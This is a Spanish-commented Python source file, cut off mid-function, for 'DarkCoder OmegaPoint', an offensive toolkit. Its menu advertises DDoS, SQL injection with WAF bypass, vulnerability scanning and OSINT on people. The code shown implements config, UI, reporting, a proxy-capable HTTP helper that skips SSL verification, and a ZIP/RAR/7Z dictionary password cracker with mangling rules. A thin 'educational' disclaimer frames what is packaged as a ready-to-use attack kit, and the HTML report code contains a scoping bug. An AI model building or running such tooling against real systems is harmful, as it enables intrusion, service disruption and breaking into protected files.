# -*- coding: utf-8 -*-
# DarkCoder v8.0 "OmegaPoint" - Ultimate Edition
# Creado con fines educativos, éticos y de I+D. El uso indebido es responsabilidad del usuario.

import os
import sys
import time
import socket
import random
import zipfile
import threading
import itertools
import requests
import re
import dns.resolver
import whois # Asegúrate de que python-whois esté instalado, no whois
from bs4 import BeautifulSoup, Comment, SoupStrainer
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote_plus, unquote_plus
import ssl
import json
import hashlib
import base64
import ipaddress
from collections import Counter
import logging
import gzip
import bz2
import html
import subprocess
import csv # For CSV reports

# ===== [ IMPORTACIONES OPCIONALES PARA CRACKING DE ARCHIVOS ] =====
try:
    import rarfile
    # rarfile.UNRAR_TOOL = "unrar" # Descomenta y ajusta si unrar no está en el PATH
    RARFILE_DISPONIBLE = True
except ImportError:
    RARFILE_DISPONIBLE = False
try:
    import py7zr
    PY7ZR_DISPONIBLE = True
except ImportError:
    PY7ZR_DISPONIBLE = False

# ===== [ IMPORTACIONES OPCIONALES PARA OSINT AVANZADO Y CRIPTO ] =====
try:
    from PIL import Image
    from PIL.ExifTags import TAGS
    PILLOW_DISPONIBLE = True
except ImportError:
    PILLOW_DISPONIBLE = False
try:
    import pypdf
    PYPDF_DISPONIBLE = True
except ImportError:
    PYPDF_DISPONIBLE = False
try:
    import docx # python-docx
    PYTHON_DOCX_DISPONIBLE = True
except ImportError:
    PYTHON_DOCX_DISPONIBLE = False
try:
    import openpyxl
    OPENPYXL_DISPONIBLE = True
except ImportError:
    OPENPYXL_DISPONIBLE = False
try:
    from shodan import Shodan # Para integración con Shodan
    SHODAN_LIB_DISPONIBLE = True
except ImportError:
    SHODAN_LIB_DISPONIBLE = False
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import padding as aes_padding
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes as crypto_hashes # Renombrado para evitar conflicto
    CRYPTOGRAPHY_LIB_DISPONIBLE = True
except ImportError:
    CRYPTOGRAPHY_LIB_DISPONIBLE = False


# ===== [ IMPORTACIÓN OPCIONAL PARA BARRAS DE PROGRESO ] =====
try:
    from tqdm import tqdm
    TQDM_DISPONIBLE = True
except ImportError:
    TQDM_DISPONIBLE = False

# ===== [ CONFIGURACIÓN INICIAL ] =====
CONFIG_FILE = "darkcoder_v8_config.json"
LOG_FILE = "darkcoder_v8_omegapoint.log"
DEFAULT_CONFIG = {
    "default_timeout": 15,
    "default_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0 DarkCoderOmega/8.0",
    "max_threads_scan": 150,
    "max_threads_ddos": 250,
    "max_threads_osint_user": 20,
    "max_crawl_depth": 3,
    "hibp_api_key": None,
    "shodan_api_key": None,
    "virustotal_api_key": None, # Nueva para OSINT Web
    "proxies_file": None, # Ruta al archivo de proxies
    "log_level": "INFO",
    "resume_crack_file": "dc_crack_session_v8.json",
    "report_subdir": "DarkCoder_Omega_Reports",
    "nmap_executable_path": "nmap", # Para AnalizadorRed y EscanerPuertos (opcional)
    "wordlist_path_hash_crack": None, # Para cracker de hashes
    "retry_attempts": 2, # Para peticiones HTTP
    "http_verify_ssl": False, # Ignorar errores SSL por defecto (entornos de prueba)
}
CONFIG = DEFAULT_CONFIG.copy()

# Silenciar warnings de InsecureRequestWarning de 'requests' si no se verifica SSL
if not CONFIG.get("http_verify_ssl", False):
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Configurar Logging (se hace después de cargar config)
def limpiar_pantalla():
    os.system("cls" if os.name == "nt" else "clear")

def configurar_logging():
    log_level_str = CONFIG.get("log_level", "INFO").upper()
    numeric_level = getattr(logging, log_level_str, logging.INFO)
    
    root_logger = logging.getLogger()
    for handler in root_logger.handlers[:]:
        root_logger.removeHandler(handler)
        
    logging.basicConfig(filename=LOG_FILE, level=numeric_level,
                        format='%(asctime)s [%(levelname)s] [%(threadName)s] %(module)s:%(funcName)s:%(lineno)d - %(message)s',
                        datefmt='%Y-%m-%d %H:%M:%S')
    
    console_handler = logging.StreamHandler(sys.stdout)
    # Nivel de consola puede ser diferente, e.g., más verboso o menos que el archivo
    console_log_level_str = CONFIG.get("console_log_level", "WARNING").upper() # Nueva config opcional
    console_numeric_level = getattr(logging, console_log_level_str, logging.WARNING)
    console_handler.setLevel(console_numeric_level) 
    console_formatter = logging.Formatter('[%(levelname)s] %(message)s')
    console_handler.setFormatter(console_formatter)
    # Descomentar si se desea log detallado a consola también.
    # logging.getLogger().addHandler(console_handler) 

def cargar_configuracion():
    global CONFIG
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                user_config = json.load(f)
                # Actualizar solo las claves que existen en DEFAULT_CONFIG para evitar configs obsoletas
                for key in DEFAULT_CONFIG:
                    if key in user_config:
                        CONFIG[key] = user_config[key]
        except json.JSONDecodeError as e_json:
            print(f"[ERROR CONFIG JSON] {CONFIG_FILE}: {e_json}. Usando defaults y reescribiendo.", file=sys.stderr)
            CONFIG = DEFAULT_CONFIG.copy() # Reset to defaults
            guardar_configuracion(notify=False) # Reescribir con defaults
        except Exception as e:
            print(f"[ERROR CARGANDO CONFIG] {CONFIG_FILE}: {e}. Usando defaults.", file=sys.stderr)
    else:
        pass # Se maneja en main
    configurar_logging()

def guardar_configuracion(notify=True):
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(CONFIG, f, indent=4, sort_keys=True)
        if notify: UI.imprimir_exito(f"Configuración guardada en {CONFIG_FILE}")
        logging.info(f"Configuración guardada en {CONFIG_FILE}")
    except Exception as e:
        if notify: UI.imprimir_error(f"Error al guardar configuración en {CONFIG_FILE}: {e}")
        logging.error(f"Error guardando configuración en {CONFIG_FILE}: {e}", exc_info=True)

# ===== [ PALETA DE COLORES ] =====
class Colores:
    ROJO = "\033[1;31m"; VERDE = "\033[1;32m"; AMARILLO = "\033[1;33m"; AZUL = "\033[1;34m"
    MAGENTA = "\033[1;35m"; CYAN = "\033[1;36m"; BLANCO = "\033[1;37m"; GRIS = "\033[90m"
    NARANJA = "\033[38;5;208m"; RESET = "\033[0m"; NEGRITA = "\033[1m"

# ===== [ ELEMENTOS DE INTERFAZ DE USUARIO (UI) ] =====
class UI:
    BANNER = f"""
{Colores.MAGENTA} ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗  ██████╗ ███████╗██████╗ 
 ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝ ██╔═══██╗██╔════╝██╔══██╗
 ██████╔╝███████║██████╔╝███████║██║  ███╗██║   ██║█████╗  ██████╔╝
 ██╔═══╝ ██╔══██║██╔══██╗██╔══██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
 ██║     ██║  ██║██║  ██║██║  ██║╚██████╔╝╚██████╔╝███████╗██║  ██║
{Colores.ROJO} ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
{Colores.BLANCO}{Colores.NEGRITA}             Ω Ρ O I N T   E D I T I O N   (v8.0){Colores.RESET}
{Colores.AZUL}     [-- Kit de Operaciones Definitivo para Pruebas de Seguridad --]
{Colores.CYAN}         [-- Creado con fines educativos, éticos y de I+D --]
{Colores.RESET}"""

    MENU_PRINCIPAL = f"""
{Colores.NARANJA}╭───────────────────────────────────────────────────────────────────────────╮
│ {Colores.CYAN}Selecciona una herramienta para desplegar:{Colores.NARANJA}                                  │
├───────────────────────────────────────────────────────────────────────────┤
│ {Colores.VERDE}[1]{Colores.BLANCO} Descifrador "QuantumCrypt" (ZIP/RAR/7Z, Mangle, Sesión, Híbrido) {Colores.NARANJA}      │
│ {Colores.VERDE}[2]{Colores.BLANCO} Simulador DDoS "NexusStorm" (Multi-Vector, Proxies, HTTP Avanzado) {Colores.NARANJA}   │
│ {Colores.VERDE}[3]{Colores.BLANCO} Escáner Vuls "SingularityScan" (Shodan, Nmap, Banners, CVEs)    {Colores.NARANJA}   │
│ {Colores.VERDE}[4]{Colores.BLANCO} Escáner SQLi "OracleMatrix X" (Múltiples DBMS, WAF Bypass, Extracción){Colores.NARANJA}│
│ {Colores.VERDE}[5]{Colores.BLANCO} OSINT Web "DeepDive Sentinel" (Crawler, JS, Cloud, Archivos, APIs)   {Colores.NARANJA}│
│ {Colores.VERDE}[6]{Colores.BLANCO} OSINT Personas "ShadowNet Intel" (Usernames, HIBP, EXIF, Dorks)  {Colores.NARANJA}   │
│ {Colores.VERDE}[7]{Colores.BLANCO} CryptoSuite "EnigmaVault" (Hash, AES, PassGen, Stego LSB)         {Colores.NARANJA}   │
│ {Colores.VERDE}[8]{Colores.BLANCO} Analizador Red "NetSpectre Prime" (Ping, Trace, Sniff Basic, Nmap) {Colores.NARANJA}│
│ {Colores.VERDE}[9]{Colores.BLANCO} Configuración Avanzada & Utilidades                             {Colores.NARANJA}       │
│ {Colores.VERDE}[10]{Colores.BLANCO} Salir de DarkCoder OmegaPoint                                    {Colores.NARANJA}       │
╰───────────────────────────────────────────────────────────────────────────╯
"""
    @staticmethod
    def imprimir_banner_animado():
        limpiar_pantalla()
        for linea in UI.BANNER.splitlines():
            for char in linea: print(char, end="", flush=True); time.sleep(0.00003) # Faster animation
            print()
        print()

    @staticmethod
    def imprimir_menu(): print(UI.MENU_PRINCIPAL)

    @staticmethod
    def imprimir_mensaje(mensaje, color=Colores.BLANCO, prefix="[*] ", log_level=logging.INFO):
        print(f"{color}{prefix}{mensaje}{Colores.RESET}")
        logging.log(log_level, f"{prefix}{mensaje}")

    @staticmethod
    def imprimir_exito(mensaje, prefix="[+] "):
        UI.imprimir_mensaje(mensaje, Colores.VERDE, prefix, logging.INFO)

    @staticmethod
    def imprimir_error(mensaje, prefix="[-] "):
        UI.imprimir_mensaje(mensaje, Colores.ROJO, prefix, logging.ERROR)

    @staticmethod
    def imprimir_advertencia(mensaje, prefix="[!] "):
        UI.imprimir_mensaje(mensaje, Colores.AMARILLO, prefix, logging.WARNING)
    
    @staticmethod
    def imprimir_info_critica(mensaje, prefix="[CRITICAL] "):
        UI.imprimir_mensaje(mensaje, Colores.ROJO + Colores.NEGRITA, prefix, logging.CRITICAL)

    @staticmethod
    def presionar_enter_continuar(mensaje="Presiona ENTER para continuar..."):
        input(f"{Colores.GRIS}{mensaje}{Colores.RESET}")

    @staticmethod
    def obtener_entrada(prompt, color=Colores.CYAN, default=None, tipo=str, opciones_validas=None, ocultar_entrada=False, requerido=True):
        prompt_completo = f"{color}{prompt}{Colores.RESET}"
        default_display = f"(default: {str(default)})" if default is not None else ""
        requerido_display = "" if requerido else "(opcional)"
        
        while True:
            full_prompt_with_hints = f"{color}{prompt.strip(': ')} {default_display} {requerido_display}: {Colores.RESET}"
            
            try:
                if ocultar_entrada:
                    import getpass
                    entrada_raw = getpass.getpass(full_prompt_with_hints)
                else:
                    entrada_raw = input(full_prompt_with_hints)
                
                entrada = entrada_raw.strip()

                if not entrada:
                    if default is not None:
                        valor_devuelto = default
                        # Si el default es una string que representa un bool, convertirlo
                        if tipo == bool and isinstance(default, str):
                            valor_devuelto = default.lower() in ['s', 'si', 'yes', 'y', 'true', '1']
                        # Si el tipo es bool y default es bool, está bien
                        elif tipo == bool and isinstance(default, bool):
                           pass # valor_devuelto ya es el default bool
                        else:
                            try: # Intentar convertir el default al tipo deseado si no es ya de ese tipo
                                valor_devuelto = tipo(default)
                            except ValueError: # Si el default no se puede convertir, es un error de programación
                                logging.error(f"Error de programacion: El default '{default}' no es compatible con el tipo '{tipo.__name__}'.")
                                UI.imprimir_error(f"Error interno con valor por defecto. Contacte al desarrollador.")
                                return None # O lanzar excepción


                    elif requerido:
                        UI.imprimir_advertencia("Este campo es requerido.")
                        continue
                    else: # No requerido y sin entrada, devolver None o el tipo vacío
                        return None if tipo != bool else False # Para bool, no entrada sin default es False

                elif tipo == bool:
                    valor_devuelto = entrada.lower() in ['s', 'si', 'yes', 'y', 'true', '1']
                else:
                    valor_devuelto = tipo(entrada)

                if opciones_validas:
                    if isinstance(opciones_validas, range) and valor_devuelto not in opciones_validas:
                        raise ValueError(f"El valor debe estar en el rango {opciones_validas.start}-{opciones_validas.stop-1}.")
                    elif not isinstance(opciones_validas, range) and valor_devuelto not in opciones_validas:
                        valid_options_str = ", ".join(map(str, opciones_validas))
                        raise ValueError(f"Opción inválida. Opciones válidas: {valid_options_str}")
                
                logging.debug(f"Entrada para '{prompt.strip(': ')}': '{valor_devuelto if not ocultar_entrada else '********'}' (Raw: '{entrada_raw}')")
                return valor_devuelto
            except ValueError as e:
                UI.imprimir_error(f"Entrada inválida: {e}. Por favor, introduce un valor de tipo '{tipo.__name__}'.")
                logging.warning(f"Entrada inválida para '{prompt.strip(': ')}': '{entrada_raw if not ocultar_entrada else '********'}'. Error: {e}")
            except Exception as e_gen:
                 UI.imprimir_error(f"Error inesperado en la entrada: {e_gen}")
                 logging.error(f"Error inesperado en entrada para '{prompt.strip(': ')}': '{entrada_raw if not ocultar_entrada else '********'}'. Error: {e_gen}", exc_info=True)
                 return None # Devolver None en caso de error inesperado grave

    @staticmethod
    def guardar_reporte(nombre_base_reporte, datos_reporte_dict, formato="txt"):
        subdirectorio = CONFIG.get("report_subdir", "DarkCoder_Omega_Reports")
        if not os.path.exists(subdirectorio):
            try: os.makedirs(subdirectorio)
            except OSError as e: UI.imprimir_error(f"No se pudo crear el directorio de reportes {subdirectorio}: {e}"); return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        nombre_base_saneado = re.sub(r'[^\w\s-]', '', nombre_base_reporte).strip().replace(' ', '_')
        nombre_base_saneado = nombre_base_saneado if nombre_base_saneado else "Reporte_DarkCoder"
        nombre_archivo = os.path.join(subdirectorio, f"{nombre_base_saneado}_{timestamp}.{formato}")
        
        try:
            with open(nombre_archivo, "w", encoding="utf-8", newline='' if formato == 'csv' else None) as f:
                if formato == "txt":
                    def escribir_diccionario_txt_recursivo(dic, indent_level=0, f_obj=f):
                        indent_str = "  " * indent_level
                        for key, value in dic.items():
                            key_str = str(key).replace('_', ' ').title()
                            if isinstance(value, dict):
                                f_obj.write(f"{indent_str}{key_str}:\n")
                                escribir_diccionario_txt_recursivo(value, indent_level + 1, f_obj)
                            elif isinstance(value, list):
                                f_obj.write(f"{indent_str}{key_str}:\n")
                                for item in value:
                                    if isinstance(item, dict):
                                        escribir_diccionario_txt_recursivo(item, indent_level + 2, f_obj)
                                        f_obj.write(f"{indent_str}    ---\n")
                                    else:
                                        f_obj.write(f"{indent_str}  - {str(item)}\n")
                            else:
                                f_obj.write(f"{indent_str}{key_str}: {str(value)}\n")
                        if indent_level == 0: f_obj.write("\n" + "="*70 + "\n\n")
                    
                    f.write(f"Reporte DarkCoder Omega: {nombre_base_reporte.replace('_', ' ').title()}\n")
                    f.write(f"Generado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("="*70 + "\n\n")
                    escribir_diccionario_txt_recursivo(datos_reporte_dict)

                elif formato == "json":
                    json.dump(datos_reporte_dict, f, indent=4, sort_keys=True, default=str) # default=str para manejar tipos no serializables
                
                elif formato == "csv":
                    # Aplanar el diccionario para CSV. Esto es una simplificación.
                    # Un CSV ideal para datos jerárquicos requiere un esquema más complejo.
                    writer = csv.writer(f)
                    writer.writerow(["Sección", "Clave", "Valor"]) # Cabecera
                    
                    def escribir_diccionario_csv_recursivo(dic, seccion_actual="", f_writer=writer):
                        for key, value in dic.items():
                            clave_completa = f"{seccion_actual}.{key}" if seccion_actual else key
                            if isinstance(value, dict):
                                escribir_diccionario_csv_recursivo(value, clave_completa, f_writer)
                            elif isinstance(value, list):
                                for i, item in enumerate(value):
                                    if isinstance(item, dict):
                                        escribir_diccionario_csv_recursivo(item, f"{clave_completa}[{i}]", f_writer)
                                    else:
                                        f_writer.writerow([seccion_actual, f"{key}[{i}]", str(item)])
                            else:
                                f_writer.writerow([seccion_actual, key, str(value)])
                    escribir_diccionario_csv_recursivo(datos_reporte_dict)

                elif formato == "html":
                    f.write("<!DOCTYPE html><html lang='es'><head><meta charset='UTF-8'><title>Reporte DarkCoder Omega</title>")
                    f.write("<style>body{font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 20px; background-color: #2c3e50; color: #ecf0f1;} ")
                    f.write("h1,h2,h3,h4{color: #e74c3c;} .container{background-color: #34495e; padding: 25px; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.5);} ")
                    f.write(".section{margin-bottom: 25px; padding:15px; border-left: 3px solid #e74c3c; background-color: #465e77; border-radius: 5px;} ")
                    f.write("ul{list-style-type: none; padding-left: 20px;} li{margin-bottom: 8px; background-color: #5b7796; padding: 8px; border-radius: 4px;} ")
                    f.write("pre{background-color: #2c3e50; color: #f1c40f; padding:12px; border:1px solid #7f8c8d; white-space: pre-wrap; word-wrap: break-word; border-radius: 4px; font-family: 'Courier New', Courier, monospace;} ")
                    f.write(".key{font-weight: bold; color: #3498db;}</style></head><body><div class='container'>")
                    f.write(f"<h1><img src='https://img.icons8.com/fluency/48/000000/shield.png' alt='Icon' style='vertical-align:middle;'> Reporte DarkCoder Omega: {html.escape(nombre_base_reporte.replace('_', ' ').title())}</h1>")
                    f.write(f"<p><em>Generado el: {datetime.now().strftime('%Y-%m-%d a las %H:%M:%S')}</em></p>")
                    
                    def escribir_diccionario_html_recursivo(dic, nivel_h_actual=2, f_obj=f):
                        for key, value in dic.items():
                            key_display = html.escape(str(key).replace('_', ' ').title())
                            f_obj.write(f"<div class='section'><h{nivel_h_actual} class='key'>{key_display}</h{nivel_h_actual}>")
                            if isinstance(value, dict):
                                escribir_diccionario_html_recursivo(value, nivel_h_actual + 1 if nivel_h_actual < 5 else 5, f_obj)
                            elif isinstance(value, list) and value:
                                f_obj.write("<ul>")
                                for item in value:
                                    f_obj.write("<li>")
                                    if isinstance(item, dict):
                                        f_obj.write("<div style='margin-left: 15px; border-left: 2px solid #1abc9c; padding-left: 10px;'>")
                                        escribir_diccionario_html_recursivo(item, nivel_h_actual + 2 if nivel_h_actual < 4 else 5, f_obj)
                                        f_obj.write("</div>")
                                    else:
                                        f_obj.write(f"<pre>{html.escape(str(item))}</pre>")
                                    f_obj.write("</li>")
                                f_obj.write("</ul>")
                            elif isinstance(value, list) and not value:
                                f_obj.write("<p><i>(Vacío o no aplica)</i></p>")
                            else:
                                f_obj.write(f"<pre>{html.escape(str(value))}</pre>")
                            f_obj.write("</div>")
                    escribir_diccionario_html_recursivo(datos_reporte_dict)
                    f_obj.write("</div></body></html>")

            UI.imprimir_exito(f"Reporte guardado en: {nombre_archivo}")
            logging.info(f"Reporte '{nombre_base_reporte}' guardado como {nombre_archivo} (Formato: {formato.upper()})")
        except Exception as e:
            UI.imprimir_error(f"Error al guardar el reporte {nombre_archivo}: {e}")
            logging.error(f"Error guardando reporte {nombre_archivo}: {e}", exc_info=True)

# ===== [ Utilidades Globales ] =====
def make_request_util(url, method="GET", headers=None, data=None, params=None, json_payload=None, allow_redirects=True, stream=False):
    """Función de utilidad para realizar peticiones HTTP con reintentos y manejo de errores."""
    session = requests.Session()
    session.headers.update({'User-Agent': CONFIG["default_user_agent"]})
    if headers:
        session.headers.update(headers)
    
    proxies = None
    if CONFIG.get("proxies_file") and os.path.exists(CONFIG["proxies_file"]):
        # Lógica simple: usar el primer proxy del archivo. Se puede mejorar para rotar.
        try:
            with open(CONFIG["proxies_file"], 'r') as pf:
                first_proxy = pf.readline().strip()
                if first_proxy:
                    proxies = {"http": first_proxy, "https": first_proxy}
                    session.proxies.update(proxies)
        except Exception as e_proxy_load:
            logging.warning(f"No se pudo cargar proxy desde {CONFIG['proxies_file']}: {e_proxy_load}")

    for attempt in range(CONFIG.get("retry_attempts", 2) + 1):
        try:
            response = session.request(
                method,
                url,
                data=data,
                params=params,
                json=json_payload,
                timeout=CONFIG["default_timeout"],
                verify=CONFIG.get("http_verify_ssl", False),
                allow_redirects=allow_redirects,
                stream=stream
            )
            response.raise_for_status() # Lanza HTTPError para 4xx/5xx
            return response
        except requests.exceptions.HTTPError as e_http:
            logging.warning(f"Error HTTP {e_http.response.status_code} para {url} (Intento {attempt+1}): {e_http}")
            if attempt == CONFIG.get("retry_attempts", 2): # Último intento
                return e_http.response # Devolver la respuesta de error en el último intento
            time.sleep(1 * (attempt + 1)) # Backoff exponencial simple
        except requests.exceptions.RequestException as e_req:
            logging.warning(f"Error de Petición para {url} (Intento {attempt+1}): {e_req}")
            if attempt == CONFIG.get("retry_attempts", 2):
                return None # O lanzar la excepción original: raise e_req
            time.sleep(1 * (attempt + 1))
    return None


# ===== [ DESCIFRADOR DE ARCHIVOS "QUANTUMCRYPT" ] =====
class DescifradorArchivos:
    ART_ASCII = f"""{Colores.MAGENTA}
    ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗████████╗██████╗ ██╗   ██╗██████╗ ████████╗
    ██╔══██╗██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝
    ██████╔╝██║   ██║███████║██╔██╗ ██║   ██║   ██████╔╝ ╚████╔╝ ██████╔╝   ██║   
    ██╔══██╗██║   ██║██╔══██║██║╚██╗██║   ██║   ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   
    ██║  ██║╚██████╔╝██║  ██║██║ ╚████║   ██║   ██║  ██║   ██║   ██║        ██║   
    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝   
{Colores.BLANCO}                           Descifrador de Archivos "QuantumCrypt"{Colores.MAGENTA}                  
    {Colores.RESET}"""
    
    CARACTERES_DEFAULT = {
        'l': "abcdefghijklmnopqrstuvwxyz", 'u': "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
        'd': "0123456789", 's': "!@#$%^&*()-_=+[]{};:'\",.<>/?`~"
    }

    def __init__(self):
        UI.imprimir_mensaje(self.ART_ASCII, Colores.MAGENTA, prefix="")
        self.last_tried_password_for_resume = None
        self.resume_file_path = CONFIG["resume_crack_file"]
        self.current_cracking_file_path = None
        self.interrupted = False

    def _cargar_sesion_crack(self):
        if os.path.exists(self.resume_file_path):
            try:
                with open(self.resume_file_path, 'r') as f:
                    sesion = json.load(f)
                if sesion.get("cracking_file_path") == os.path.abspath(self.current_cracking_file_path):
                    self.last_tried_password_for_resume = sesion.get("last_password_tried")
                    if self.last_tried_password_for_resume:
                        UI.imprimir_exito(f"Sesión de cracking reanudada. Última probada: {self.last_tried_password_for_resume[:30]}...")
                        logging.info(f"Sesión de cracking reanudada para {self.current_cracking_file_path} desde '{self.last_tried_password_for_resume}'.")
                        return True
                else:
                    logging.info(f"Archivo de sesión encontrado pero para un archivo diferente. Ignorando.")
            except Exception as e:
                UI.imprimir_error(f"Error al cargar sesión de cracking: {e}")
                logging.error(f"Error cargando sesión de cracking: {e}", exc_info=True)
        return False

    def _guardar_sesion_crack(self, password_actual):
        if not self.current_cracking_file_path: return
        sesion_data = {
            "cracking_file_path": os.path.abspath(self.current_cracking_file_path),
            "last_password_tried": password_actual,
            "timestamp": datetime.now().isoformat()
        }
        try:
            with open(self.resume_file_path, 'w') as f:
                json.dump(sesion_data, f, indent=2)
            logging.debug(f"Sesión de cracking guardada: {password_actual[:30]}...")
        except Exception as e:
            logging.error(f"Error al guardar sesión de cracking: {e}", exc_info=True)

    def _limpiar_sesion_crack(self):
        if os.path.exists(self.resume_file_path):
            try:
                os.remove(self.resume_file_path)
                logging.info(f"Archivo de sesión de cracking {self.resume_file_path} eliminado.")
            except Exception as e:
                logging.error(f"Error eliminando archivo de sesión: {e}", exc_info=True)
        self.last_tried_password_for_resume = None

    def _intentar_zip(self, zf_obj, password, pbar_ref):
        try:
            zf_obj.extractall(pwd=password.encode('utf-8', 'surrogateescape'))
            return True
        except Exception:
            if pbar_ref and not pbar_ref.disable: pbar_ref.set_description_str(f"{Colores.GRIS}ZIP Try: {password[:20].ljust(20)}{Colores.RESET}")
            return False

    def _intentar_rar(self, rf_obj, password, pbar_ref):
        if not RARFILE_DISPONIBLE: return False
        try:
            rf_obj.extractall(pwd=password)
            return True
        except Exception: # rarfile.BadRarFile, rarfile.NoRarEntry
            if pbar_ref and not pbar_ref.disable: pbar_ref.set_description_str(f"{Colores.GRIS}RAR Try: {password[:20].ljust(20)}{Colores.RESET}")
            return False
    
    def _intentar_7z(self, ruta_7z_archivo, password, pbar_ref):
        if not PY7ZR_DISPONIBLE: return False
        try:
            with py7zr.SevenZipFile(ruta_7z_archivo, mode='r', password=password) as szf:
                szf.extractall() # Puede especificar path=...
            return True
        except Exception: # py7zr.exceptions.Bad7zFile, py7zr.exceptions.PasswordRequired, etc.
            if pbar_ref and not pbar_ref.disable: pbar_ref.set_description_str(f"{Colores.GRIS}7Z Try: {password[:20].ljust(20)}{Colores.RESET}")
            return False

    def _abrir_diccionario(self, ruta_diccionario_path):
        try:
            if ruta_diccionario_path.endswith(".gz"):
                return gzip.open(ruta_diccionario_path, "rt", encoding='utf-8', errors="ignore")
            elif ruta_diccionario_path.endswith(".bz2"):
                return bz2.open(ruta_diccionario_path, "rt", encoding='utf-8', errors="ignore")
            else:
                return open(ruta_diccionario_path, "r", encoding='utf-8', errors="ignore")
        except FileNotFoundError:
            UI.imprimir_error(f"Archivo de diccionario no encontrado: {ruta_diccionario_path}")
            raise
        except Exception as e:
            UI.imprimir_error(f"Error abriendo diccionario {ruta_diccionario_path}: {e}")
            raise

    def _generador_diccionario_con_mangle(self, ruta_dicc, reglas_mangle_str=None):
        reglas_procesadas = []
        if reglas_mangle_str:
            for regla_item_str in reglas_mangle_str.split(','):
                partes_regla = regla_item_str.strip().split(':', 2)
                op_regla = partes_regla[0].strip()
                args_regla = [arg.strip() for arg in partes_regla[1:]] if len(partes_regla) > 1 else []
                if op_regla: reglas_procesadas.append({'op': op_regla, 'args': args_regla})
        
        reanudar_activado = self.last_tried_password_for_resume is not None
        # Para reanudar, necesitamos saber si la última contraseña probada *pudo* haber sido generada
        # por la palabra base actual o una anterior. Es complejo.
        # Simplificación: si `last_tried_password_for_resume` existe, iteramos sobre el generador
        # hasta que encontremos `last_tried_password_for_resume`, y luego empezamos a `yield` el siguiente.
        # Esto es costoso si se reanuda tarde en un diccionario con mucho mangleo.
        # Una mejor aproximación para el diccionario simple (sin mangleo) es saltar líneas.
        # Con mangleo, la estrategia de saltar hasta la última contraseña es la más robusta, aunque lenta para empezar.
        
        palabra_reanudacion_encontrada = not reanudar_activado
        
        contador_lineas_base = 0
        try:
            with self._abrir_diccionario(ruta_dicc) as f_dict:
                for linea_diccionario in f_dict:
                    if self.interrupted: break
                    palabra_base_original = linea_diccionario.strip()
                    if not palabra_base_original: continue
                    contador_lineas_base +=1

                    palabras_a_procesar_mangle = {palabra_base_original}
                    
                    if reglas_procesadas:
                        conjunto_passwords_actual_mangle = {palabra_base_original}
                        for regla_act_mangle in reglas_procesadas:
                            nuevas_generadas_por_regla_mangle = set()
                            for p_a_manglear in conjunto_passwords_actual_mangle:
                                try:
                                    op, args = regla_act_mangle['op'], regla_act_mangle['args']
                                    if op == '$' and args: nuevas_generadas_por_regla_mangle.add(p_a_manglear + args[0]) # Append
                                    elif op == '^' and args: nuevas_generadas_por_regla_mangle.add(args[0] + p_a_manglear) # Prepend
                                    elif op == 's' and len(args) == 2: nuevas_generadas_por_regla_mangle.add(p_a_manglear.replace(args[0], args[1])) # Substitute
                                    elif op == 'c': nuevas_generadas_por_regla_mangle.add(p_a_manglear.capitalize()) # Capitalize
                                    elif op == 'u': nuevas_generadas_por_regla_mangle.add(p_a_manglear.upper()) # Uppercase
                                    elif op == 'l': nuevas_generadas_por_regla_mangle.add(p_a_manglear.lower()) # Lowercase
                                    elif op == 'd': nuevas_generadas_por_regla_mangle.add(p_a_manglear + p_a_manglear) # Duplicate
                                    elif op == 'r': nuevas_generadas_por_regla_mangle.add(p_a_manglear[::-1]) # Reverse
                                    elif op == 't': # Toggle case
                                        # t sin args: togglea todo
                                        # t:N : togglea en pos N
                                        # t:N,M : togglea en pos N y M
                                        p_list_toggle = list(p_a_manglear)
                                        if not args: # Toggle all
                                            p_list_toggle = [char.swapcase() for char in p_list_toggle]
                                        else:
                                            pos_validas_toggle = [int(idx_str) for idx_str in args[0].split(';') if idx_str.isdigit() and 0 <= int(idx_str) < len(p_list_toggle)]
                                            for pos_toggle in pos_validas_toggle: p_list_toggle[pos_toggle] = p_list_toggle[pos_toggle].swapcase()
                                        nuevas_generadas_por_regla_mangle.add("".join(p_list_toggle))
                                    # Añadir más reglas de mangleo comunes (leet, etc.)
                                    elif op == 'L': # Simple Leet (a=@, e=3, i=1, o=0, s=$, t=7)
                                        leet_map = {'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7', 'A': '@', 'E': '3', 'I': '1', 'O': '0', 'S': '$', 'T': '7'}
                                        nuevas_generadas_por_regla_mangle.add("".join(leet_map.get(char, char) for char in p_a_manglear))
                                    else: nuevas_generadas_por_regla_mangle.add(p_a_manglear)
                                except (IndexError, ValueError) as e_mangle:
                                    logging.debug(f"Error aplicando regla mangle '{regla_act_mangle}' en '{p_a_manglear}': {e_mangle}")
                                    nuevas_generadas_por_regla_mangle.add(p_a_manglear)
                            conjunto_passwords_actual_mangle.update(nuevas_generadas_por_regla_mangle)
                        palabras_a_procesar_mangle = conjunto_passwords_actual_mangle
                    
